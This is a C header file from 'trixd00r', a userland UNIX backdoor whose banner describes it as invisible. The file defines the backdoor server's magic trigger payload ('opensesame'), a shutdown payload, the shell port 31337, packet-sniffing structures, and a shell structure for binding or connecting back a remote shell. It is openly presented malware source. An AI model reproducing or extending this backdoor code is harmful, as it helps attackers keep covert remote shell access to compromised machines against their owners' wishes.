/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/inc/sniffer.h                                                        *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#ifndef __SNIFFER_H__
#define __SNIFFER_H__


#define _BSD_SOURCE 1       /* bsd style api */
#define __FAVOR_BSD 1


#include <pcap.h>
#include <netinet/in.h>


/* default values */
#define DEF_HOST        "ANY"           /* default allowed host */
#define DEF_TYPE        _TCP_SYN_TYPE   /* packet/protocol type */
#define DEF_PAYLOAD     "opensesame"    /* magic payload */
#define DEF_BYE_PAYLOAD "byebye"        /* magic BYE payload */
#define DEF_PORT        31337           /* port for shell */


/* ethernet related */
#define ETHER_ADDR_LEN	6       /* ethernet address length */
#define SIZE_ETHERNET   14      /* ethernet header size always 14 bytes */


/* ip related */
#define IP_RF       0x8000                  /* reserved fragment flag */
#define IP_DF       0x4000                  /* dont fragment flag */
#define IP_MF       0x2000                  /* more fragments flag */
#define IP_OFFMASK  0x1fff                  /* mask for fragmenting bits */
#define IP_HL(ip)   (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)    (((ip)->ip_vhl) >> 4)


/* tcp related */
#define TH_FIN 0x01     /* TCP FIN flag */
#define TH_SYN 0x02     /* TCP SYN flag */
#define TH_RST 0x04     /* TCP RST flag */
#define TH_PUSH 0x08    /* TCP PUSH flag */
#define TH_ACK 0x10     /* TCP ACK flag */
#define TH_URG 0x20     /* TCP URG flag */
#define TH_ECE 0x40     /* TCP ECE flag */
#define TH_CWR 0x80     /* TCP CWR flag */
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)


/* packet type descriptions */
#define TCP_SYN_TYPE    "TCP SYN packet"
#define TCP_ACK_TYPE    "TCP ACK packet"
#define TCP_RST_TYPE    "TCP RST packet"
#define TCP_PSH_TYPE    "TCP PSH packet"
#define TCP_URG_TYPE    "TCP URG packet"
#define TCP_FIN_TYPE    "TCP FIN packet"
#define UDP_TYPE        "UDP datagram"
#define ICMP_ECHO_TYPE  "ICMP echo"


/* supported protocol names */
#define _TCP_PROT   "tcp"
#define _UDP_PROT   "udp"
#define _ICMP_PROT  "icmp"


/* is it our magic packet or not? */
#define IS_NOT_MAGIC_PACKET 0
#define IS_MAGIC_PACKET     1
#define IS_BYEBYE_PACKET    2


/* ethernet header */
typedef struct {
    unsigned char dhost[ETHER_ADDR_LEN];    /* Destination host address */
    unsigned char shost[ETHER_ADDR_LEN];    /* Source host address */
    unsigned short type;                    /* IP? ARP? RARP? etc */
} ether_t;


/* ip header */
typedef struct {
    unsigned char ip_vhl;       /* version << 4 | header length >> 2 */
    unsigned char ip_tos;       /* type of service */
    unsigned short ip_len;      /* total length */
    unsigned short ip_id;       /* identification */
    unsigned short ip_off;      /* fragment offset field */
    unsigned char ip_ttl;       /* time to live */
    unsigned char ip_p;         /* protocol */
    unsigned short ip_sum;      /* checksum */
    struct in_addr src, dst;    /* source and dest address */
} ip_t;


/* tcp header */
typedef struct {
    unsigned short th_sport;    /* source port */
    unsigned short th_dport;    /* destination port */
    unsigned int th_seq;        /* sequence number */
    unsigned int th_ack;        /* acknowledgement number */
    unsigned char th_offx2;     /* data offset, rsvd */
    unsigned char th_flags;     /* tcp flags */
    unsigned short th_win;      /* window */
    unsigned short th_sum;      /* checksum */
    unsigned short th_urp;      /* urgent pointer */
} tcp_t;


/* udp header */
typedef struct {
    uint16_t uh_sport;         /* source port */
    uint16_t uh_dport;         /* destination port */
    uint16_t uh_ulen;          /* udp length */
    uint16_t uh_sum;           /* udp checksum */
} udp_t;


/* sniffer related data */
typedef struct {
    pcap_t *handle;             /* pcap handler */
    const char *iface;          /* interface to use */
    bpf_u_int32 mask;           /* netmask of device */
    bpf_u_int32 net;            /* ipaddr of device */
} sniffer_t;


/* packet related data */
typedef struct {
    const ether_t *ether;           /* sniffed ethernet header */
    const ip_t *ip;                 /* sniffed ip header */
    const tcp_t *tcp;               /* sniffed tcp header */
    const udp_t *udp;               /* sniffed udp header */
    const unsigned char *bytes;     /* pcap packet bytes, len etc. */
    unsigned char type;             /* magic packet type */
    char *m_payload;                /* magic payload */
    char *b_payload;                /* magic BYE payload */
    char *s_payload;                /* sniffed payload */
    unsigned int size_ip;           /* size of ip header */
    unsigned int size_tcp;          /* size of tcp header */
    unsigned int size_udp;          /* size of udp header */
    char src_host[16];              /* address of source host */
    char dst_host[16];              /* address of destination host */
    char *allowed_host;             /* allowed host to talk to trixd00rd */
} packet_t;


/* shell related data */
typedef struct {
    unsigned char banner;       /* send banner or not ? */
    unsigned char mode;         /* shell mode */
    const char *descr;          /* short description */
    const char *host;           /* host to connect back */
    uint16_t port;              /* port to bind or connect back */
    int lfd;                    /* listen socket */
    int cfd;                    /* connected socket */
    struct sockaddr_in srv;     /* server address */
    struct sockaddr_in cli;     /* client address */
    pid_t pid;                  /* parent/child proccess id */
} shell_t;


/* controller's working template */
typedef struct {
    sniffer_t *sniffer;         /* see sniffer.h */
    packet_t *packet;           /* see sniffer.h */
    shell_t *shell;             /* see shell.h */
    unsigned char daemon;       /* daemonize or not */
    unsigned char ssl;          /* use ssl encryption */
    unsigned char verbose;      /* verbosity */
} ctrl_t;


enum {
    _TCP_SYN_TYPE = 0, _TCP_ACK_TYPE, _TCP_RST_TYPE, _TCP_PSH_TYPE,
    _TCP_URG_TYPE, _TCP_FIN_TYPE, _UDP_TYPE, _NUM_PKT_TYPES
};


/* print available packet types */
void print_packet_types();


/* sniff magic packet */
unsigned char watch_packet(ctrl_t *);


/* prepare sniffer, all pcap needed stuff */
void prepare_sniffer(ctrl_t *);


#endif

/* EOF */
